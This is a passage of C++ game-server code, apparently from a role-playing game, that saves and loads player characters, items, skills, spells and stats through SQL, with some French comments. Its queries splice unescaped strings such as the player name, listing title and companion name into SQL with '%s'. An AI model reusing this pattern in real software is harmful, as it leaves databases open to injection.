      if( obj->GetStaticReference() != __OBJ_GOLD && Unit::GetNameFromID( obj->GetStaticReference(), (LPTSTR)(LPCTSTR)lpszName, U_OBJECT ) )
      {
         // Insert new object into PlayerItems table
         csQuery.Format( 
            "INSERT INTO PlayerItems( ObjID, OwnerID, EquipPos, ObjType, Qty, MadeBy ) VALUES ( "
            "%u,"
            "%u,"
            "0,"
            "'%s',"
            "%u,"
            "'%s'"
            " )",
            obj->GetID(),
            dwUserID,					
            lpszName,
            obj->GetQty(),
            obj->GetCreatedBy()
            );

         ADD_QUERY

         // If the object is shared.
         if( !obj->IsUnique() )
         {
            // Remove the charges flag to avoid cluttering the database.
            obj->RemoveFlag( __FLAG_CHARGES );
         }


         // Then save the object's specific flags.
         if( obj->SaveFlags( lptlSQLRequests, GetID() ) ) //backpack
         {
            boDBError = TRUE;
         }

         
         /*
         if( obj->SaveBoosts( lptlSQLRequests, GetID() ) )// Save the BackPack object's boosts.
         {
            boDBError = TRUE;
            _LOG_DEBUG
               LOG_CRIT_ERRORS,
               "***** BOOST(Backpack) problem for Player %s",
               GetTrueName()
               LOG_
         }
         */

         // If the object is shared.
         if( !obj->IsUnique() )
         {
            // Re-set the flags to continue playing.
            obj->SetFlag( __FLAG_CHARGES, 1 );
         }
         iNbrItemCount++;
      }
      
   }

   // Save the items that are on the trade container as if they were on user's backpack

   _LOG_DEBUG
      LOG_DEBUG_HIGH,
      "Saving items being traded"
      LOG_

      if (isTradeValidAndTrading == TRUE) 
      {
         ItemContainer *tradeItemContainer = m_TradeMgr2.GetItemContainer();
         TemplateList<Objects> *tloTradeItems = tradeItemContainer->LockAndGetList();
         tloTradeItems->ToHead();
         while( tloTradeItems->QueryNext() && !boDBError )
         {
            Objects *obj = tloTradeItems->Object();

            // If the item is not gold and if the unit name ID could be found
            if( obj->GetStaticReference() != __OBJ_GOLD && Unit::GetNameFromID( obj->GetStaticReference(), (LPTSTR)(LPCTSTR)lpszName, U_OBJECT ) )
            {
               // Insert new object into PlayerItems table
               csQuery.Format( 
                  "INSERT INTO PlayerItems( ObjID, OwnerID, EquipPos, ObjType, Qty, MadeBy ) VALUES ( "
                  "%u,"
                  "%u,"
                  "0,"
                  "'%s',"
                  "%u,"
                  "'%s'"
                  " )",
                  obj->GetID(),
                  dwUserID,					
                  lpszName,
                  obj->GetQty(),
                  obj->GetCreatedBy()
                  );

               ADD_QUERY

                  // If the object is shared.
                  if( !obj->IsUnique() )
                  {
                     // Remove the charges flag to avoid cluttering the database.
                     obj->RemoveFlag( __FLAG_CHARGES );
                  }

                  // Then save the object's specific flags.
                  if( obj->SaveFlags( lptlSQLRequests, GetID() ) ) //Item On trade
                  {
                     boDBError = TRUE;
                  }

                  // Save the object's boosts.
                  /*
                  if( obj->SaveBoosts( lptlSQLRequests, GetID() ) ) // Save the InTrade object's boosts.
                  {
                     boDBError = TRUE;
                     _LOG_DEBUG
                        LOG_CRIT_ERRORS,
                        "***** BOOST(InTrade) problem for Player %s",
                        GetTrueName()
                        LOG_
                  }
                  */

                  // If the object is shared.
                  if( !obj->IsUnique() )
                  {
                     // Re-set the flags to continue playing.
                     obj->SetFlag( __FLAG_CHARGES, 1 );
                  }
                  iNbrItemCount++;
            }
            
         }
         tradeItemContainer->UnlockAndReleaseList();
         m_TradeMgr2.GetCLock()->Unlock();
      }
      backpack->Unlock();

      // Then save equipped objects

      _LOG_DEBUG
         LOG_DEBUG_HIGH,
         "Saving equipment"
         LOG_

      {
         int j;			
         for(j = 0; j < EQUIP_POSITIONS; j++)
         {
            int nEquipPos = j + 1;

            // If item is equipped
            Objects *obj = static_cast< Objects *>( equipped[j] );
            if( obj != NULL )
            {
               // If object is equipped in both hands.
               if( j == weapon_right && equipped[ weapon_left ] == equipped[ weapon_right ] )
               {
                  nEquipPos = two_hands + 1;
               }

               if(!( j == weapon_left && equipped[ weapon_left ] == equipped[ weapon_right ] ) )
               {
                  // If unit name ID could be found
                  if( Unit::GetNameFromID( obj->GetStaticReference(), (LPTSTR)(LPCTSTR)lpszName, U_OBJECT ) )
                  {
                     // Insert new object into PlayerItems table
                     csQuery.Format( 
                        "INSERT INTO PlayerItems( ObjID, OwnerID, EquipPos, ObjType, Qty, MadeBy ) VALUES ( "
                        "%u,"
                        "%u,"
                        "%u,"
                        "'%s',"
                        "%u,"
                        "'%s'"
                        ")",
                        obj->GetID(),
                        dwUserID,
                        nEquipPos,
                        lpszName,
                        obj->GetQty(),
                        obj->GetCreatedBy()

                        );

                     ADD_QUERY

                        // Then save the object's specific flags
                        if( obj->SaveFlags( lptlSQLRequests, GetID() ) ) //equiped items
                        {
                           boDBError = TRUE;
                        }

                        // Save the object's boosts.
                        /*
                        if( obj->SaveBoosts( lptlSQLRequests, GetID() ) ) // Save the InTrade object's boosts.
                        {
                           boDBError = TRUE;
                           _LOG_DEBUG
                              LOG_CRIT_ERRORS,
                              "***** BOOST(Equipement) problem for Player %s",
                              GetTrueName()
                              LOG_
                        }
                        */

                       iNbrItemCount++;
                  }				
               }
            }
         }
      }


     

      if(bChestSaved)
      {
         // Save user chest
         _LOG_DEBUG
            LOG_DEBUG_HIGH,
            "Saving chest"
            LOG_

         csQuery.Format( "DELETE FROM ChestItems WHERE OwnerID=%u", GetID() );
         ADD_QUERY

         // Begin by saving the chest
         TemplateList<Objects> *tlChestList = chest->LockAndGetList();

         tlChestList->ToHead();
         while( tlChestList->QueryNext() && !boDBError )
         {
            Objects *obj = tlChestList->Object();

            // If the unit name ID could be found
            if( Unit::GetNameFromID( obj->GetStaticReference(), (LPTSTR)(LPCTSTR)lpszName, U_OBJECT ) )
            {
               // Insert new object into PlayerItems table
               csQuery.Format( 
                  "INSERT INTO ChestItems( ObjID, OwnerID, ObjType, Qty, MadeBy ) VALUES ( "
                  "%u,"
                  "%u,"
                  "'%s',"
                  "%u,"
                  "'%s'"
                  " )",
                  obj->GetID(),
                  dwUserID,					
                  lpszName,
                  obj->GetQty(),
                  obj->GetCreatedBy()

                  );

               ADD_QUERY

                  // If the object is shared.
                  if( !obj->IsUnique() )
                  {
                     // Remove the charges flag to avoid cluttering the database.
                     obj->RemoveFlag( __FLAG_CHARGES );
                  }

                  // Then save the object's specific flags.
                  if( obj->SaveFlags( lptlSQLRequests, GetID() ) )
                  {
                     boDBError = TRUE;
                  }

                  // If the object is shared.
                  if( !obj->IsUnique() )
                  {
                     // Re-set the flags to continue playing.
                     obj->SetFlag( __FLAG_CHARGES, 1 );
                  }
                  iNbrChestItemCount++;
            }
         } 
         chest->UnlockAndReleaseList();
      }

      // Save user skills
      _LOG_DEBUG
         LOG_DEBUG_HIGH,
         "Saving skills"
         LOG_

      {
         csQuery.Format( "DELETE FROM PlayerSkills WHERE OwnerID=%u", dwUserID );

         ADD_QUERY

            for(i = 0; i < NB_SKILL_HOOKS; i++)
            {
               tlusSkills[i].Lock();
               tlusSkills[i].ToHead();
               while( tlusSkills[i].QueryNext() && !boDBError )
               {
                  LPUSER_SKILL lpusUserSkill = tlusSkills[i].Object();

                  _LOG_DEBUG
                     LOG_DEBUG_LVL4,
                     "Character %s (ID %u) saving skill %u with %u pnts.",
                     (LPCTSTR)GetName( _DEFAULT_LNG ),
                     dwUserID,
                     lpusUserSkill->GetSkillID(),
                     lpusUserSkill->GetTrueSkillPnts()
                     LOG_

                     // Then save the user-skill.
                     csQuery.Format( 
                     "INSERT INTO PlayerSkills( OwnerID, SkillID, SkillPnts ) VALUES ( "
                     "%u,"	// OwnerID.
                     "%u,"	// SkillID.
                     "%u"	// SkillPnts.	
                     " )",
                     dwUserID,
                     lpusUserSkill->GetSkillID(),
                     lpusUserSkill->GetTrueSkillPnts()
                     );

                  ADD_QUERY
               }
               tlusSkills[i].Unlock();
            }				
      }
 
      // Save effects
      _LOG_DEBUG
         LOG_DEBUG_HIGH,
         "Saving effects"
         LOG_

         if( SaveEffects( lptlSQLRequests, GetID() ) )
         {
            boDBError = TRUE;
         }

         // Save the boosts
         _LOG_DEBUG
            LOG_DEBUG_HIGH,
            "Saving boosts"
            LOG_

            if( SaveBoosts( lptlSQLRequests, GetID() ) ) //player Boosts
            {
               boDBError = TRUE;
               _LOG_DEBUG
                  LOG_CRIT_ERRORS,
                  "***** BOOST(Player Boosts) problem for Player %s",
                  GetTrueName()
                  LOG_
            }

            // Then save the player's spells.
            _LOG_DEBUG
               LOG_DEBUG_HIGH,
               "Saving spells"
               LOG_

            {
               LPUSER_SKILL lpUserSkill;
               tlusSpells.Lock();
               tlusSpells.ToHead();

               csQuery.Format( "DELETE FROM PlayerSpells WHERE OwnerID=%u", dwUserID );

               ADD_QUERY
                  while( tlusSpells.QueryNext() && !boDBError )
                  {
                     lpUserSkill = tlusSpells.Object();

                     csQuery.Format(
                        "INSERT INTO PlayerSpells( OwnerID, SpellID ) VALUES ( "
                        "%u,"
                        "%u"
                        " )",
                        dwUserID,
                        lpUserSkill->GetSkillID()
                        );

                     ADD_QUERY
                     iNbrSpellCount++;
                  }
                  tlusSpells.Unlock();
            }		


            //NMNMNM  SAVE FORMULE_USER_APPRIS
            _LOG_DEBUG
               LOG_DEBUG_HIGH,
               "Saving profession Know Formula"
               LOG_

            {
               LPUSER_PROFESSION_F lpProfFormula;
               tlProfessionAcq.Lock();
               tlProfessionAcq.ToHead();

               csQuery.Format( "DELETE FROM PlayerProfession WHERE OwnerID=%u", dwUserID );

               ADD_QUERY
                  while( tlProfessionAcq.QueryNext() && !boDBError )
                  {
                     lpProfFormula = tlProfessionAcq.Object();

                     csQuery.Format(
                        "INSERT INTO PlayerProfession( OwnerID, FormuleID ) VALUES ( "
                        "%u,"
                        "%u"
                        " )",
                        dwUserID,
                        lpProfFormula->ushID
                        );

                     ADD_QUERY
                  }


                  tlProfessionAcq.Unlock();
            }	



            // Save the user's flags.
            _LOG_DEBUG
               LOG_DEBUG_HIGH,
               "Saving flags"
               LOG_

               if( SaveFlags( lptlSQLRequests, GetID() ) ) //Player flads
               {
                  boDBError = TRUE;
               }

               // Updating character data.
               _LOG_DEBUG
                  LOG_DEBUG_HIGH,
                  "Updating character data."
                  LOG_

                  CString csName = GetTrueName();
               csName.TrimRight();
               csName.TrimLeft();
               SetName( csName );

               DWORD moveExhaust = 0, mentalExhaust = 0, attackExhaust = 0;

               DWORD curRound = TFCMAIN::GetRound();

               EXHAUST exhaust = GetExhaust();
               if( exhaust.move > curRound )
               {
                  moveExhaust = ( exhaust.move - curRound ) * 50;
               }
               if( exhaust.mental > curRound )
               {
                  mentalExhaust = ( exhaust.mental - curRound ) * 50;
               }
               if( exhaust.attack > curRound )
               {
                  attackExhaust = ( exhaust.attack - curRound ) * 50;
               }

               // Build the primary UPDATE query
               csQuery.Format(
                  "UPDATE PlayingCharacters SET "
                  "PlayerName='%s',"
                  "Strength=%u,"
                  "Endurance=%u,"
                  "Agility=%u,"
                  "Intelligence=%u,"
                  //"WillPower=%u,"
                  "Wisdom=%u,"
                  "Luck=%u,"
                  "AttackSkill=%u,"
                  "DodgeSkill=%u,"
                  "XP=%f,"
                  "CurrentLevel=%u,"
                  "CurrentHP=%u,"
                  "MaxHP=%u,"
                  "CurrentMana=%u,"
                  "MaxMana=%u,"
                  "Gold=%u,"
                  "wlX=%u,"
                  "wlY=%u,"
                  "wlWorld=%u,"
                  "SkillPnts=%u,"
                  "StatPnts=%u,"
                  "Corpse=%u,"
                  "Appearance=%u,"
                  "Karma=%d,"
                  "Gender=%u,"
                  "ListingTitle='%s',"
                  "ListingMisc='%s',"
                  "MoveExhaust=%u,"
                  "MentalExhaust=%u,"
                  "AttackExhaust=%u,"
                  "Crime=%d,"
                  "Honor=%d,"
                  "CompanionName='%s',"
                  "CompanionID=%d,"
                  "RPXp=%d,"
                  "RPXpPoint=%d "
                  "WHERE UserID=%u",

                  (LPCTSTR)GetTrueName(),
                  GetTrueSTR(),
                  GetTrueEND(),
                  GetTrueAGI(),
                  GetTrueINT(),
                  //GetTrueWIL(),
                  GetTrueWIS(),
                  GetTrueLCK(),			
                  GetTrueATTACK(),
                  GetTrueDODGE(),
                  (double)GetXP(),
                  GetLevel(),
                  GetHP(),
                  GetTrueMaxHP(),
                  GetMana(),
                  GetTrueMaxMana(),
                  GetGold(),
                  GetWL().X,
                  GetWL().Y,
                  GetWL().world,
                  wNbSkillPnts,
                  wNbStatPnts,
                  Corpse,
                  Appearance,
                  nKarma,
                  bGender,
                  (LPCTSTR)csListingTitle,
                  (LPCTSTR)csListingMisc,
                  moveExhaust,
                  mentalExhaust,
                  attackExhaust,
                  GetCrime(),
                  GetHonor(),
                  GetCompagnonName(),
                  GetCompagnonID(),
                  GetRP_XP(),
                  0,
                  GetID()
                  );



               ADD_QUERY

               //ici on sauve les info critique par userID dans un file binaire...
               //on sauve toujours sa vas uniquement creer de la junk sur le HD et si le systeme
               //se mets a ON ou OFF sa marchera a tous les coup pour evider davoird es ancien fichier pas a jours...

               CString strPathBD;
               CString strExtBDFile;
               strExtBDFile.Format("%06d.bin",GetID());
               strPathBD = TFCMAIN::GetHomeDir();
               strPathBD += "EXTBD\\";
               CreateDirectory( strPathBD, NULL ); //sera creer au save pas au read...
               strPathBD+=strExtBDFile;
               FILE *pfBin = NULL;
               fopen_s(&pfBin,strPathBD,"wb");
               if(pfBin)
               {
                  EXTBDCheck newCheck;

                  newCheck.wStr           = GetTrueSTR();
                  newCheck.wEnd           = GetTrueEND();
                  newCheck.wAgi           = GetTrueAGI();
                  newCheck.wInt           = GetTrueINT();
                  newCheck.wWis           = GetTrueWIS();
                  newCheck.wStP           = wNbStatPnts;
                  newCheck.wSkP           = wNbSkillPnts;
                  newCheck.wPadding       = 0;
                  newCheck.dXP            = (double)GetXP();
                  newCheck.dwMaxHP        = GetTrueMaxHP();
                  newCheck.dwMaxMP        = GetTrueMaxMana();
                  newCheck.iGold          = GetGold();
                  newCheck.iNbrItem       = iNbrItemCount;
                  newCheck.iNbrChestItem  = iNbrChestItemCount;
                  newCheck.iNbrSpell      = iNbrSpellCount;
                  fwrite(&newCheck,sizeof(newCheck),1,pfBin);
                  fclose(pfBin);
               }




                  if( boCallback )
                  {
                     _LOG_DEBUG
                        LOG_DEBUG_HIGH,
                        "Sending batch saving with callback"
                        LOG_

                        _LOG_DEBUG    
                        LOG_DEBUG_LVL1,
                        "Starting saving character %s chest(%s). (callback -%s)",
                        (LPCTSTR)GetTrueName(),
                        (bChestSaved?"true":"false"),
                        pstrFromWho
                        LOG_

                        m_dwSaveCallBackTimeStart = timeGetTime();
                        ODBCCharAsyncSave.SendBatchRequest( lptlSQLRequests, DataSaveCallback, this , "CharAsyncSave");
                  }
                  else
                  {
                     _LOG_DEBUG
                        LOG_DEBUG_HIGH,
                        "Sending batch saving without callback"
                        LOG_
                        _LOG_DEBUG    
                        LOG_DEBUG_LVL1,
                        "Starting saving character %s chest(%s). (no-callback) %s",
                        (LPCTSTR)GetTrueName(),
                        (bChestSaved?"true":"false"),
                        pstrFromWho
                        LOG_

                        ODBCCharAsyncSave.SendBatchRequest( lptlSQLRequests, NULL, this ,"CharAsyncSave");
                  }
   Unlock();
   return FALSE;
}
/******************************************************************************/
// Loads a character.
/******************************************************************************/
int Character::LoadCharacter(CString csName) // The character name to load.
{
   PlayerGold = 0;

   int iNbrItemCount      = 0;
   int iNbrChestItemCount = 0;
   int iNbrSpellCount     = 0;

   Players *pl = (Players *)ThisPlayer;
   if( pl == NULL )
   {
      return 6;
   }

   
   _LOG_DEBUG
      LOG_DEBUG_HIGH,
      "Locking ODBC"
      LOG_

   CString csQuery;
   csQuery.Format( "SELECT "
   "UserID,"
   "AccountName,"
   "wlX,"
   "wlY,"
   "wlWorld,"
   "nClass,"
   "CurrentHP,"
   "MaxHP,"
   "CurrentMana,"
   "MaxMana,"
   "Strength,"
   "Endurance,"
   "Agility,"
   "Intelligence,"
   "Wisdom,"
   "CurrentLevel,"
   "AttackSkill,"
   "DodgeSkill,"
   "Gold,"
   "Appearance,"
   "Corpse,"
   "XP,"
   "StatPnts,"
   "SkillPnts,"
   "Karma,"
   "Gender,"
   "ListingTitle,"
   "ListingMisc,"
   "MoveExhaust,"
   "MentalExhaust,"
   "AttackExhaust,"
   "Crime,"
   "Honor,"
   "Luck,"
   "CompanionName,"
   "CompanionID,"
   "RPXp,"
   "RPXpPoint"
   " FROM PlayingCharacters WHERE PlayerName='%s'", (LPCTSTR)csName );

   // Lock the ODBC connection
   ODBCCharRead.Lock();
   ODBCCharRead.SendRequest( (LPCTSTR)csQuery );
   
   if( ODBCCharRead.Fetch() ) // If user was fetched, it exists
   {
      char lpszUserName[21];
      WORD	wTemp;
      DWORD	dwTemp;
      double  dblTemp;
      long    lTemp;

      FETCH_DWORD( DB_ID );
      SetID( dwTemp );

      // Get the binded user name.
      ODBCCharRead.GetString( DB_AccountName, lpszUserName, 21 );

      // If the case insensitive account name isn't the same, do not load player.
      if( _stricmp( lpszUserName, (LPCTSTR)pl->GetAccount() ) == 0 )
      {
         //LOAD THE CHARACTER INFO...
         WorldPos wlPos;
         DWORD dwGold;

         FETCH_DWORD( DB_wlX );
         wlPos.X = dwTemp;
         FETCH_DWORD( DB_wlY );
         wlPos.Y = dwTemp;
         FETCH_DWORD( DB_wlWorld );
         wlPos.world = dwTemp;
         SetWL(wlPos);            
         FETCH_DWORD( DB_CurrentHP );
         SetHP( dwTemp, false );
         FETCH_DWORD( DB_MaxHP );
         SetMaxHP( dwTemp );
         FETCH_WORD( DB_CurrentMana );
         SetMana( wTemp );
         FETCH_WORD( DB_MaxMana );
         SetMaxMana( wTemp );
         FETCH_WORD( DB_Strength );
         SetSTR( wTemp );
         FETCH_WORD( DB_Endurance );
         SetEND( wTemp );
         FETCH_WORD( DB_Agility );
         SetAGI( wTemp );
         FETCH_WORD( DB_Intelligence );
         SetINT( wTemp );
         FETCH_WORD( DB_Wisdom );
         SetWIS( wTemp );
         FETCH_WORD( DB_Level );
         SetLevel( wTemp );
         FETCH_WORD( DB_AttackSkill );
         SetATTACK( wTemp );
         FETCH_WORD( DB_DodgeSkill );
         SetDODGE( wTemp );
         FETCH_DWORD( DB_Gold );
         dwGold = dwTemp;
         FETCH_WORD( DB_Appearance );
         Appearance = wTemp;
         FETCH_WORD( DB_Corpse );
         Corpse = wTemp;
         ODBCCharRead.GetDouble( DB_XP, &dblTemp );
         SetXP( (signed __int64)dblTemp ,true);
         FETCH_WORD( DB_StatPnts );
         wNbStatPnts = wTemp;
         FETCH_WORD( DB_SkillPnts );
         wNbSkillPnts = wTemp;
         FETCH_WORD( DB_nClass );
         nClass = (BYTE)wTemp;
         FETCH_SDWORD( DB_Karma );
         nKarma = lTemp;
         FETCH_WORD( DB_Gender );
         bGender = static_cast< BYTE>( wTemp );

         char szListing[ 1024 ];
         szListing[ 0 ] = 0;
         ODBCCharRead.GetString( DB_ListingTitle, szListing, 1024 );
         SetTitle(szListing);

         szListing[ 0 ] = 0;
         ODBCCharRead.GetString( DB_ListingMisc, szListing, 1024 );
         SetListingMiscDesc(szListing);

         loadMoveExhaust = loadMentalExhaust = loadAttackExhaust = 0;

         FETCH_DWORD( DB_MoveExhaust );
         loadMoveExhaust = dwTemp;
         FETCH_DWORD( DB_MentalExhaust );
         loadMentalExhaust = dwTemp;
         FETCH_DWORD( DB_AttackExhaust );
         loadAttackExhaust = dwTemp;            
         FETCH_SDWORD( DB_Crime );
         nCrime = lTemp;
         FETCH_SDWORD( DB_Honor );
         nHonor = lTemp;
         FETCH_WORD( DB_Luck );
         SetLCK( wTemp );

         szListing[ 0 ] = 0;
         ODBCCharRead.GetString( DB_MinionName, szListing, 1024 );
         m_strCompagnonName.Format("%s",szListing);

         FETCH_WORD( DB_MinionID );
         SetCompagnonID( wTemp );

         FETCH_SDWORD( DB_RpXP );
         SetRP_XP( lTemp );

         FETCH_SDWORD( DB_RpXPPoint );
         m_iRPXPPoint = lTemp;

         ODBCCharRead.Cancel();


         
         //LOAD CHARACTER FLAGS
         LoadFlags( ODBCCharRead, GetID() );
         ODBCCharRead.Cancel();

         //valide si le jouer est en position arena on le fou a son sanctuaire
         // If player died in an Arena Location
         list< sCombatArenaLocation >::iterator i;
         bool boFound = false;	

         //Scan type 1
         for( i = theApp.CombatArenaLocationList1.begin(); i != theApp.CombatArenaLocationList1.end(); ++i )
         {
            WorldPos wlTL = (*i).wlTopLeft;
            WorldPos wlBR = (*i).wlBottomRight;
            // If player is in the same world as the current location
            if( wlPos.world == (*i).wlTopLeft.world )
            {
               // If player is in the good x range
               if( wlPos.X >= (*i).wlTopLeft.X && wlPos.X <= (*i).wlBottomRight.X )
               {
                  // And if player is in the good y range
                  if( wlPos.Y >= (*i).wlTopLeft.Y && wlPos.Y <= (*i).wlBottomRight.Y )
                  {
                     // Player is in this kind of area!
                     boFound = true;					
                     break;
                  }
               }
            }
         }

         //Scan type 2
         if(!boFound)
         {
            for( i = theApp.CombatArenaLocationList2.begin(); i != theApp.CombatArenaLocationList2.end(); ++i )
            {
               WorldPos wlTL = (*i).wlTopLeft;
               WorldPos wlBR = (*i).wlBottomRight;
               // If player is in the same world as the current location
               if( wlPos.world == (*i).wlTopLeft.world )
               {
                  // If player is in the good x range
                  if( wlPos.X >= (*i).wlTopLeft.X && wlPos.X <= (*i).wlBottomRight.X )
                  {
                     // And if player is in the good y range
                     if( wlPos.Y >= (*i).wlTopLeft.Y && wlPos.Y <= (*i).wlBottomRight.Y )
                     {
                        // Player is in this kind of area!
                        boFound = true;					
                        break;
                     }
                  }
               }
            }
         }

         if(boFound)
         {
            DWORD dwPosValue = ViewFlag( __FLAG_DEATH_LOCATION );
            wlPos.X     = ( (WORD)( dwPosValue >> 20 ) ) & 0x0FFF;	
            wlPos.Y     = ( (WORD)( dwPosValue >> 8 )  ) & 0x0FFF;
            wlPos.world = ( (BYTE)( dwPosValue ) & 0xFF );
            SetWL(wlPos);     
         }
         
         
         
         if(m_iRPXPPoint > 0)
         {
            SetFlag(__FLAG_POINTS_RP_XP_EVENTS      ,m_iRPXPPoint);
            SetFlag(__FLAG_POINTS_RP_XP_EVENTS_TOTAL,m_iRPXPPoint);
            
         }
         m_iRPXPPoint = 0;




         if( ViewFlag( __FLAG_LIGHT_RESIST ) == 0 )
             SetLightResist( 5000 );

         //Set the NMS FreeLevel
         #ifdef BUILD_NMS_CUSTOM_NPC
            if( ViewFlag(__FLAG_MAJ01_REROLL_FREE)==0)
            {
               if(GetLevel() > 49)
                  SetFlag(__FLAG_MAJ01_REROLL_FREE,1);
               else if (ViewFlag(__FLAG_NUMBER_OF_REMORTS) > 0)
                  SetFlag(__FLAG_MAJ01_REROLL_FREE,1);
               else if(ViewFlag(__FLAG_NMS_DECHU) >0 )
                  SetFlag(__FLAG_MAJ01_REROLL_FREE,1);
               else
                  SetFlag(__FLAG_MAJ01_REROLL_FREE,9);
            }
         #endif


         BOOL bREsetBoustEquipPos = FALSE;
         //Verifie si on doit resetter des parametres...
         if((theApp.m_dwResetBoustEquipPos >0 && theApp.m_dwResetBoustEquipPos != ViewFlag( __FLAG_RESET_BOUST_EQUIP_POS )) || ViewFlag( __FLAG_RESET_BOUST_EQUIP_POS_USER_ONLY ) >0)  
         {
            bREsetBoustEquipPos = TRUE;

            //reset sa pos a son sanctuaire si pas en prison...
            if( ViewFlag(__FLAG_NMS_EN_PRISON) == 0)
            {
               DWORD dwPosValue = ViewFlag( __FLAG_DEATH_LOCATION );
               if( dwPosValue == 0 )
               {
                  //erreur de ssanctu on fait rien...
               }
               else 
               {	
                  wlPos.X     = ( (WORD)( dwPosValue >> 20 ) ) & 0x0FFF;	// Strip the first 4 bits of the word.
                  wlPos.Y     = ( (WORD)( dwPosValue >> 8 )  ) & 0x0FFF;
                  wlPos.world = ( (BYTE)( dwPosValue ) & 0xFF );
                  SetWL(wlPos);    
               }
            }

            // clear boust table for this user...
            // clear uniquement pour single user car si c un reset serveur la table
            // boust est effacer dans linit de la BD...
            if(ViewFlag( __FLAG_RESET_BOUST_EQUIP_POS_USER_ONLY ) >0)
            {
               _LOG_DEBUG
                  LOG_WARNING,
                  "*** Reset player BOOSTS*** Character %s (%s) ",
                  GetTrueName(),
                  pl->GetFullAccountName()
                  LOG_

               ODBCCharWrite.Lock();
               csQuery.Format( "DELETE FROM Boosts WHERE BaseOwnerID=%d", GetID() );
               if(ODBCCharWrite.SendRequest( (LPCTSTR)csQuery ))
                  ODBCCharWrite.Commit();
               ODBCCharWrite.Cancel();
               ODBCCharWrite.Unlock();
               SetFlag( __FLAG_RESET_BOUST_EQUIP_POS_USER_ONLY ,0);

            }
            else
            {
               SetFlag(__FLAG_RESET_BOUST_EQUIP_POS,theApp.m_dwResetBoustEquipPos);
            }
         }

         


         //LOAD CHARACTER USER ITEMS
         {				
            DWORD dwTempID;
            const int DB_ObjID    =		1;				
            const int DB_EquipPos =		2;
            const int DB_ObjType  =		3;
            const int DB_Qty      =    4;
            const int DB_MadeBy   =    5;

            //Unit *lpuItem;
            LOADED_ITEM *lpLoadedItem;

            // Temporary list which will contain the loaded items.				
            TemplateList < LOADED_ITEM > tlLoadedItems;
            csQuery.Format( "SELECT ObjID, EquipPos, ObjType, Qty, MadeBy FROM PlayerItems WHERE OwnerID=%u", GetID() );
            if( ODBCCharRead.SendRequest( (LPCTSTR)csQuery ) )
            {
               // Scroll through all fetched records.
               while( ODBCCharRead.Fetch() )
               {						
                  lpLoadedItem = new LOADED_ITEM;

                  ODBCCharRead.GetDWORD ( DB_ObjID,    &lpLoadedItem->dwObjID );
                  ODBCCharRead.GetBYTE  ( DB_EquipPos, &lpLoadedItem->bEquipPos );
                  ODBCCharRead.GetString( DB_ObjType,  (LPTSTR)lpLoadedItem->lpszObjType, 50 );
                  ODBCCharRead.GetDWORD ( DB_Qty,      &lpLoadedItem->dwQty );
                  if( lpLoadedItem->dwQty == 0 )
                  {
                     lpLoadedItem->dwQty = 1;
                  }
                  memset(lpLoadedItem->lpszMadeBy     ,0x00,50);
                  ODBCCharRead.GetString( DB_MadeBy,  (LPTSTR)lpLoadedItem->lpszMadeBy, 50 );

                  if(bREsetBoustEquipPos)
                  {
                     //on reset tous les item equiper directement...
                     bool bFOundStill = FALSE;
                     for(int i=0;i<theApp.m_aStillItems.GetSize();i++)
                     {
                        WORD wID = Unit::GetIDFromName( lpLoadedItem->lpszObjType, U_OBJECT, TRUE );
                        if(theApp.m_aStillItems[i] == wID)
                        {
                           bFOundStill = TRUE;
                           i = theApp.m_aStillItems.GetSize();
                        }
                     }
                     if(!bFOundStill)
                        lpLoadedItem->bEquipPos = 0;
                  }

                  // Add them to the loaded items list.
                  tlLoadedItems.AddToTail( lpLoadedItem );
                  iNbrItemCount++;
               }
               ODBCCharRead.Cancel();

               int w;
               for( w = 0; w < EQUIP_POSITIONS; w++ )
                  equipped[ w ] = 0;                        

               // Scroll through the loaded items
               BOOL bHaveGemofMinion = FALSE;
               tlLoadedItems.ToHead();
               while( tlLoadedItems.QueryNext() )
               {
                  lpLoadedItem = tlLoadedItems.Object();
                  
                  Objects *lpuItem = new Objects();

                  // If object could be created
                  WORD wID = Unit::GetIDFromName( lpLoadedItem->lpszObjType, U_OBJECT, TRUE );
                  if(theApp.m_dwMinionGemID >0)
                  {
                     if(wID == theApp.m_dwMinionGemID)
                        bHaveGemofMinion = TRUE;
                  }

                  if( lpuItem->Create( U_OBJECT,  wID) )
                  {
                     // Temporarly replace the unit's ID to load its flags, boosts and effects
                     dwTempID = lpuItem->GetID();
                     lpuItem->SetID( lpLoadedItem->dwObjID );

                     lpuItem->SetQty( lpLoadedItem->dwQty );
                     if(lpLoadedItem->lpszMadeBy)
                        lpuItem->SetCreatedBy( (char*)lpLoadedItem->lpszMadeBy);
                     else
                        lpuItem->SetCreatedBy("");

                     _item *itemStructure = NULL;

                     lpuItem->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &itemStructure );

                     int chargeValue = 0;
                     if( itemStructure != NULL && itemStructure->magic.charges < 0 )
                     {
                        chargeValue = -1;
                     }

                     // Flush the object's CHARGE flag created by ObjectStructure
                     // If the object has flags, they will be loaded.
                     lpuItem->SetFlag( __FLAG_CHARGES, chargeValue );

                     //LOAD CHARACTER ITEMS FLAGS
                     lpuItem->LoadFlags( ODBCCharRead, GetID() );		 //Load item backpack					
                     ODBCCharRead.Cancel(); //Cancel Previous fetch

                     // If the item is not unique, set its charge to 1 since
                     // it wasn't saved to avoid cluttering the database.
                     if( !lpuItem->IsUnique() )
                     {
                        lpuItem->SetFlag( __FLAG_CHARGES, 1 );
                     }

                     // Reset the item's ID to its newly assigned one.
                     lpuItem->SetID( dwTempID );

                     // If item is in the backpack;
                     if( lpLoadedItem->bEquipPos == 0 )
                     {
                        // Add it to the backpack.
                        AddToBackpack( lpuItem );
                     }
                     else if( lpLoadedItem->bEquipPos <= EQUIP_POSITIONS )
                     {
                        if( lpLoadedItem->bEquipPos - 1 == two_hands )
                        {                                    
                           if( equipped[ weapon_right ] != NULL )
                           {
                              equipped[ weapon_right ]->DeleteUnit();
                           }
                           if( equipped[ weapon_left ] != equipped[ weapon_right ] && 
                              equipped[ weapon_left ] != NULL )
                           {
                              equipped[ weapon_left ]->DeleteUnit();
                           }
                           equipped[ weapon_right ] = equipped[ weapon_left ] = lpuItem;

                        }
                        else
                        {
                           // otherwise add it to its equip position.
                           if( equipped[ lpLoadedItem->bEquipPos - 1 ] != NULL )
                           {
                              // Crush current equipped item.
                              equipped[ lpLoadedItem->bEquipPos - 1 ]->DeleteUnit();
                           }

                           equipped[ lpLoadedItem->bEquipPos - 1 ] = lpuItem;
                        }
                     }
                  }
                  else
                  {
                     lpuItem->DeleteUnit();
                  }
                  tlLoadedItems.DeleteAbsolute();
               }
